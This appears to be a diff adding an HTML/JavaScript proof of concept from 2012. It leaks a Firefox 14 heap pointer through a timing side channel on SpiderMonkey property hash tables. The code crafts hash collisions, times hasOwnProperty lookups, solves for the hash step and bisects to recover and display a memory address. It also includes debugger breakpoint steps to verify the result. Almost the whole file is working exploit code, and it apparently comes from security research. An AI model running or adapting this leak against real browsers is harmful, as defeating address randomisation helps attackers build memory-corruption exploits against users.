@@ -1,0 +1,608 @@
+<! -- 
+Leaking information using side channel (timing) attack.
+
+07.08.2012
+p_k
+twitter.com/pa_kt
+gdtr.wordpress.com
+--!>
+
+<html>
+    <head>
+        <link href="style.css" rel="stylesheet" type="text/css">
+        <script language="javascript" type="text/javascript" src="flot/jquery.js"></script>
+        <script language="javascript" type="text/javascript" src="flot/jquery.flot.js"></script>
+        <script language="javascript" type="text/javascript" src="underscore-min.js"></script>
+    </head>
+    <div class="row">
+        <h1>result</h1>
+        <h2>ptr: <b id="res_ptr"></b></h2>
+        <h2>time: <b id="res_time"></b></h2>
+        <br/>
+        <p>
+        (FF 14) bp js::PropertyTable::search+0x7 "j poi(ecx+4)>0x2000 '';'gc'" <br/>
+        Ignore the first hit. EAX == ptr on second hit.
+        </p>
+        <input id="vrf_button" type="button" onclick="verify();" value="verify" style="visibility: hidden"/>
+        <br/>
+    </div>
+    <div>
+        <div class="column0">
+            <h2>Solver</h2>
+            <div class="column1">
+                <h2>Chain length vs. lookup time</h2>
+                <div id="calib-plot" style="width:100%; height:50%;">
+                </div>
+                <div id="calib">
+                </div>
+            </div>
+            <div class="column1">
+                <h2>Lookup time after removing elements</h2>
+                <div id="detected-plot" style="width:100%; height:50%;">
+                </div>
+                <div id="info">
+                </div>
+            </div>
+        </div>
+        <div class="column2">
+            <h2>current max</h2>
+            <div id="max_out">
+            </div>
+        </div>
+        <div class="column2">
+            <h2>stats</h2>
+            <div id="out">
+            </div>
+        </div>
+    </div>
+    <script src="uint.js"></script>
+    <script src="utils.js"></script>
+<script>
+    // Time consuming functions have to be run by setInterval(), otherwise GUI would block
+    // and FF would ask the user if he wants to terminate the script. 
+    // Because of this, variables shared between these functions need to be in the same
+    // scope. In this situation global scope is as good as any other. That's why there's
+    // so many global vars in here.
+
+    GOLDEN = 2654435769;    //golden ratio, 0x9E3779B9
+    GOLDEN_INV = 340573321; //inverse % 2^32
+    HASH_BITS = 32;
+
+    var clock_start = new Date().getTime();
+
+    //log2 + 1
+    function get_log2(n){
+        log2 = Math.log(n) / Math.log(2);
+        log2 = Math.floor(log2);
+        if(Math.pow(2, log2) != n){
+            throw "not a power of 2";
+        }
+        log2 += 1;
+        return log2;
+    }
+
+    function get_hash_shift(log2){
+        return HASH_BITS - log2; 
+    }
+
+    function decode(x, n){
+        var log2 = get_log2(n);
+        var hash_shift = get_hash_shift(log2);
+        var dec = mul(add(shl(x, 1), 1), GOLDEN);
+        dec = shr(dec, hash_shift);
+        return dec;
+    }
+    
+    function make_col(x, hash_shift, f_seq){
+        var x = shl(x, hash_shift);
+        while(1){
+            var r= f_seq();
+            r = 2*r+1;
+            var y = add(x, r);
+            y = mul(y, GOLDEN_INV);
+            y = shr(y, 1);
+            if(y < 0x40000000){ //fuck you, js int conversions
+                x = y;
+                break;
+            }
+        }
+        return x;
+    }
+    function max_elems(n){
+        return (2*n*0.75)-2;
+    }
+    function fill(n){
+        var log2 = get_log2(n);
+        var hash_shift = get_hash_shift(log2);
+        var tab = [];
+        var f_rnd = function () {return Math.floor(Math.random()*shl(1, hash_shift-2));}
+        var max_i = max_elems(n);
+        for(var i=1;i<max_i;i++){    //leave 0 untouched
+            var x = make_col(i, hash_shift, f_rnd);
+            tab.push(x);
+        }
+        return tab;
+    }
+
+    function measure(oo, x, k){
+        var s = 0;
+        var start = new Date().getTime();
+        for(var i=0;i<k;i++){
+            s += oo.hasOwnProperty(x);
+        }
+        var end = new Date().getTime();
+        var time = end - start;
+        return time;
+    }
+
+    out = document.getElementById("out");
+    out_info = document.getElementById("info");
+    max_out = document.getElementById("max_out");
+    calib = document.getElementById("calib");
+    res_ptr = document.getElementById("res_ptr");
+    res_time = document.getElementById("res_time");
+    vrf_button = document.getElementById("vrf_button");
+
+    //how long does it take to traverse N collisions?
+    function calibration(n, o, k){
+        var log2 = get_log2(n);
+        var hash_shift = get_hash_shift(log2);
+        var stats = [];
+        var seq_i = 0;
+        var step = 256;
+        var i = 0;
+        var c = 0;
+        var f_seq = function () { seq_i = seq_i+1; return seq_i; };
+
+        var t0 = measure(o, 0, k);
+        stats.push([0, t0]);
+        while(c<16){
+            i += step;
+            seq_i = 0;
+            var col = make_col(i, hash_shift, f_seq);
+            var h2 = shr(shl(2*(seq_i)+1, log2), hash_shift) | (1>>>0);
+            var chain_len = Math.floor(i/h2);
+            if(o.hasOwnProperty(col) || chain_len < 8){
+                continue;
+            }
+            var t = measure(o, col, k);
+            stats.push([chain_len, t]);
+            c += 1;
+        }
+        return stats;
+    }
+
+    function plot_points(node_id, pts, p_label){
+        $.plot($(node_id), [{data: pts, points: {show: true}, label:p_label}]);        
+    }
+    function plot_calib(stats, m, b){
+        var d1 = [];
+        var d2 = [];
+
+        var min = _.min(stats, fst);
+        var max = _.max(stats, fst);
+        var x_range = _.range(fst(min), fst(max));
+        var y_fit = _.map(x_range, function (x){ return m*x+b;});
+
+        d1 = stats;
+        d2 = _.zip(x_range, y_fit);
+                                                                                                          
+        $.plot($("#calib-plot"), [{data: d1, points: {show: true}, label:"Observed"}, {data: d2, label: "Predicted"}]);        
+    }
+
+    var detect_single = function(mstr, to_test, colliders, o, k, threshold){
+        function set_props(props, obj){
+            _.map(props, function(c){ obj[c]=1;});
+            return obj;
+        }
+        function rem_props(props, obj){
+            _.map(props, function (c){ delete obj[c]; });
+            return obj;
+        }
+
+        var cols_len = colliders.length;
+        var rng = _.range(to_test*2);
+        while(1){
+            //colliders starts at 1
+            var rnd = _.map(rng, function (x) { return Math.floor(Math.random()*(cols_len-2))+1;});
+            rnd = _.uniq(rnd);
+            rnd = _.first(rnd, to_test);
+            var cols = _.map(rnd, function (i) { return colliders[i]; });
+            var unq = _.uniq(cols);
+            //alert(_.size(cols)+"/"+_.size(unq));
+            cols = unq;
+            //remove random keys
+            rem_props(cols, o);
+            var t = measure(o, mstr, k);
+            //did the time change?
+            if(t < threshold){
+                var all = cols;
+
+                /*
+                alert("dbg");
+                var t = measure(o, mstr, k);
+                alert(t);
+                */
+
+                while(all.length > 1){
+                    var n = all.length;
+                    var h = Math.floor(n/2);
+                    var l = _.first(all, h);
+                    var r = _.last(all, n-h);
+                    var z = l.slice();
+                    //var inter = _.intersection(l, r);
+                    //alert(inter);
+                    set_props(l, o);
+                    var t = measure(o, mstr, k);
+                    if(t < threshold){
+                        all = r;
+                    }
+                    else{
+                        rem_props(l, o);
+                        set_props(r, o);
+                        all = l;
+                    }
+                }
+                var found = all[0];
+                //o[found] = 1;
+                return found;
+            }
+            else{
+                set_props(cols, o);
+            }
+        }
+        throw new Error("not reached");
+    }
+
+    var N = 1<<16;
+    var start = 0;
+    var end = 0x300;
+    var k = 10000;
+    var interval;
+    var M = 0;
+    var Mstr = "";
+    var str = "";
+    var cur = start;
+    var flag = 0;
+    var cur_const = 0;
+    var stab = [];
+    var sobj = {};
+    var zero_time = 0;
+    var threshold = 0;
+
+    var o = new Object();
+    var colliders = fill(N);
+    var mixed = shuffle(colliders.slice());
+    _.map(mixed, function (col){ o[col] = 1; });
+
+    //make shure we can handle different speeds of CPUs
+    var g = 1.33;
+    while(1){
+        zero_time = measure(o, 0, k);
+        if(zero_time < 2){
+            k = Math.floor(k*g);
+        }
+        else if(zero_time > 15){
+            k = Math.floor(k*(1/g));
+        }
+        else{
+            break;
+        }
+        dump_s(out_info, "zero_time: {0}, adjusting k to: {1}".format(zero_time, k));
+    }
+
+    var stats = calibration(N, o, k);
+    _.map(stats, function (p) {dump(calib, p);});
+
+    var fit = ls_fit(stats);
+    var m = fit[0];
+    var b = fit[1];
+    plot_calib(stats, m, b);
+
+    var f_pred = function (x) { return m*x+b; };
+    var errors = _.map(stats, function (p){ return p[1] - f_pred(p[0]); });
+    var sigma = std(errors);
+    var sigma2 = 2*sigma;
+
+    var info = "y={0}*x+{1}, sigma={2}".format(m.toFixed(2), b.toFixed(2), sigma.toFixed(2));
+    dump_s(out_info, info);
+    var info = "2sigma (95%) interval: [{0}, {1}]".format(-sigma2.toFixed(2), sigma2.toFixed(2));
+    dump_s(out_info, info);
+
+    var clen = 0;
+    var tick = function(){
+        //fixme: 7, 500
+        if(M > 7*zero_time && clen>400){
+            //alert("M:"+M+", zt:"+zero_time);
+            cur = 0;
+            clearInterval(interval);
+            interval = setInterval(solve, 1);
+            return;
+        }
+
+        var str = "str.0x"+cur.toString(16)+"r"+rand(5);
+        sobj[str] = 1;  //IMPORTANT! force atomization of str
+
+        t = measure(o, str, k);    
+
+        if(t>M){
+            M = t;
+            Mstr = str;
+            clen = Math.round((M-b)/m);
+            dump(max_out, [cur.toString(16), M]);
+        }
+        if(cur%0x20==0){
+            dump(out, [cur, t]);
+        }
+        cur += 1;
+    }
+
+    var found_cols = [];
+    var col = 0;
+    var to_test = 0;
+
+    //set by calc()
+    var step = 0;
+    var indexes = [];
+    //set by solve()
+    var ch0 = 0;
+    var ch1 = 0;
+    var possible = [];
+    var solve = function(){
+        function plot_decoded(pairs){
+            plot_points("#detected-plot", pairs, "Time after removing element");
+        }
+        function calc(found, clen){
+            //sign of r, a[n] = a+n*r
+            var sgn = 0;    
+            //uniq indexes
+            var pairs = _.uniq(found, 0, function (p) { return p[0]; });    
+            //sort by time
+            pairs = _.sortBy(pairs, function (p) { return p[1]; });         
+            pairs = _.map(pairs, function (p) { return [decode(p[0], N), p[1]]; });
+            plot_decoded(pairs);
+
+            sgn = pairs[0][0] - pairs[pairs.length-1][0];
+            if(sgn != 0){
+                sgn = sgn / Math.abs(sgn);
+            }
+
+            var ind = _.map(pairs, fst);
+            //_.map(ind, function (x) { return dump_s(out_info, x.toString());});
+            var pairs = _.zip(ind, _.tail(ind).concat([_.head(ind)]));
+            pairs = _.initial(pairs);
+            var diffs = _.map(pairs, function (p) { return p[1]-p[0];} );
+
+            //gcd is always positive
+            //global var
+            gcd = mgcd(diffs);  
+            var ro = sgn * gcd;
+
+            if(gcd == 1){
+                /*
+                var s = ind.join(",");
+                s = "hits = ["+s+"]";
+                dump_s(out_info, s);
+                s = "chlen = {0}".format(ch0);
+                dump_s(out_info, s);
+                */
+
+                var n = 2*N;
+                var hd = _.head(ind);
+                var diffs = _.map(ind, function (x) { return mod(sub(hd, x), n); });
+                diffs.shift();
+                diffs = _.filter(diffs, function (d){ return d!=0; });
+                var rng = _.range(1, clen);
+                var diff = _.head(diffs);
+                var possible_now = [];
+                for(i in rng){
+                    var tmp = xgcd(i, n);
+                    var ix = tmp[0];
+                    var d = tmp[2]; //gcd
+                    if(diff % d != 0){
+                        continue;
+                    }
+                    var r0 = mod(mul(ix, div(diff, d)), n);
+                    if(r0%2 == 0){
+                        continue;
+                    }
+                    //sols = map(lambda i: (r0+i*(N/d))%N, range(d))
+                    var sols = _.map(_.range(d), function(x){ return mod(add(r0, mul(x, div(n, d))), n)}); 
+                    for(var j=0; j<sols.length;j++){
+                        var r = sols[j];
+                        var ri = inv(r, n);
+                        var itab = _.map(diffs, function (x) { return mod(mul(ri, x), n); });
+                        var itab2 = _.filter(itab, function (x) { return x < 2*clen; });
+                        if(itab.length == itab2.length){
+                            var g = mgcd(itab);
+                            if(g==1){
+                                step = r;
+                                break;
+                            }
+                        }
+                    }
+                    if(step != 0){
+                        break;
+                    }
+                }
+            }
+            else{
+                //global var
+                step = ro;
+            }
+            indexes = ind;
+            dump_s(out_info, "gcd: {0}, step: {1}".format(gcd, step));
+            return gcd;
+        }
+        if(found_cols.length > 8){
+            gcd = calc(found_cols, clen);
+            cur = 0;
+            if((gcd == 1 && step == 0) || gcd%2==0){
+                //no luck
+                dump_s(out_info, "gcd={0}, restarting".format(gcd));
+                found_cols = [];
+                //clearInterval(interval);
+                return;
+            }
+            clearInterval(interval);
+            interval = setInterval(bisect, 1);
+            return;
+        }
+        if(cur == 0){
+            var M0 = M-sigma2;
+            var M1 = M+sigma2;
+            var ch = Math.round((M-b)/m);
+            ch0 = Math.round((M0-b)/m);
+            ch1 = Math.round((M1-b)/m);
+            var p = ch0 / max_elems(N);                 //prob. of success in 1 test
+            to_test = Math.log(0.01) / Math.log(1-p);   //how many tests to bring the prob. of failure to 1%?
+            to_test = Math.ceil(to_test);
+            threshold = M/2.5;
+            var txt = "Mt:{0}, predicted chain len:{1}, 95% interval: [{2}, {3}]".format(M, ch, ch0, ch1);
+            dump_s(out_info, txt);
+            txt = "Assuming ch:{0}. Testing {1} elements for 1% failure prob.".format(ch0, to_test);
+            dump_s(out_info, txt);
+        }
+        col = detect_single(Mstr, to_test, colliders, o, k, threshold);
+        t0 = measure(o, Mstr, k);
+        o[col] = 1;
+        if(t0<M/2){
+            txt = "Detected: {0} (dec: {2}), time dropped to {1}".format(col.toString(16), t0, decode(col, N));
+            found_cols.push([col, t0]);
+        }
+        else{
+            txt = "Fluke: {0} (dec: {2}), time: {1}".format(col.toString(16), t0, decode(col, N));
+        }
+        dump_s(out_info, txt);
+        cur += 1;
+
+    }
+
+    //find chain's beginning
+    //passed from calc(): step, indexes
+    //from solve(): ch1
+    var cur = 0;
+    var start_idx = 0;
+    var chl = 0;
+    var p0 = p1 = 0;
+    var verify_flag = 0;
+    var bisect = function() {
+        function idx_measure(idx){
+            //colliders is indexed from 1 :P
+            var col = colliders[idx-1];
+            //dump_s(out_info, "testing, col: {0}, idx: {1}".format(col.toString(16), idx));
+            delete o[col];
+            var t = measure(o, Mstr, k);
+            o[col] = 1;
+            return t;
+        }
+        //-1 if idx is inside the chain
+        //0 if idx is the start of the chain
+        //1 if idx is outside of the chain
+        function position(idx0, idx1, threshold){
+            function in_bounds(idx){
+                if(idx < 0 || idx >= colliders.length){
+                    return 0;
+                }
+                return 1;
+            }
+            if(in_bounds(idx0) != 1 || in_bounds(idx1) != 1){
+                return 1;
+            }
+            var t0 = idx_measure(idx0);
+            var t1 = idx_measure(idx1);
+            dump_s(out_info, "t0: {0}, t1: {1}".format(t0, t1));
+            //removing both made no difference, so they must be outside
+            if(t0 > threshold && t1 > threshold){
+                return 1;
+            }
+            //removing 1st made a difference and the next one didn't, so this has to be the start
+            else if(t0 < threshold && t1 > threshold){
+                return 0;
+            }
+            //both cause a significant drop in lookup time, so they have to be inside
+            else if(t0 < threshold && t1 < threshold){
+                return -1;
+            }
+            else{
+                //dump_s(out_info, "t0: {0}, t1: {1}".format(t0, t1));
+                clearInterval(interval);
+                throw new Error("not reached in position();");
+            }
+        }
+        function recover(idx, step, n){
+            var log2 = get_log2(n);
+            var hash_shift = get_hash_shift(log2);
+            var hi = shl(idx, hash_shift);
+            var lo = shr(shl(step, hash_shift), log2);
+            var x = hi+lo;
+            x = mul(x, GOLDEN_INV);
+            return x;
+        }
+        if(cur == 0){
+            //assume the chain is two times bigger than predicted
+            chl = 2*ch1;
+            start_idx = indexes[0];
+            p0 = 0;
+            p1 = ch1;
+            //dump_s(out_info, "sta
+        }
+        if(cur > chl || cur>4000000){
+            clearInterval(interval);
+            return;
+        }
+        var mid = Math.floor((p0+p1)/2);
+        var idx0 = mod(add(start_idx, mul(mid, step)), 2*N);
+        var idx1 = mod(add(idx0, step), 2*N);
+        if(idx0 == mid){
+            clearInterval(interval);
+            throw new Error("loop");
+            return;
+        }
+        //dump_s(out_info, "idx0: {0}, idx1: {1}".format(idx0, idx1));
+        var relaxed_threshold = threshold * (2.5/2);
+        var pos = position(idx0, idx1, relaxed_threshold);  //more room for error than with M/2.5
+
+        dump_s(out_info, "{0} position: {1}".format(idx0, pos));
+
+        //inside
+        if(pos == -1){
+            p0 = mid;
+        }
+        //outside
+        else if(pos == 1){
+            p1 = mid;
+        }
+        //hit
+        else if(pos == 0){
+            clearInterval(interval);
+            var end = new Date().getTime();
+            var delta = end - clock_start;
+            var ptr = recover(idx0, step, N);
+            dump_s(out_info, "found start: {0}".format(idx0));
+            dump_s(out_info, "ptr: {0}".format(ptr.toString(16)));
+            var t = text_node(ptr.toString(16));
+            res_ptr.appendChild(t); 
+            var t = text_node((delta/1000).toFixed(2))
+            res_time.appendChild(t);
+            vrf_button.style.visibility = "visible";
+            return;
+        }
+        else{
+            clearInterval(interval);
+            throw new Error("bad pos");
+        }
+
+        cur++;
+    }
+    function verify(){
+        alert("set bp");
+        o.hasOwnProperty(Mstr);
+    }
+
+    interval = setInterval(tick, 1);
+
+</script>
+</html>
+
+
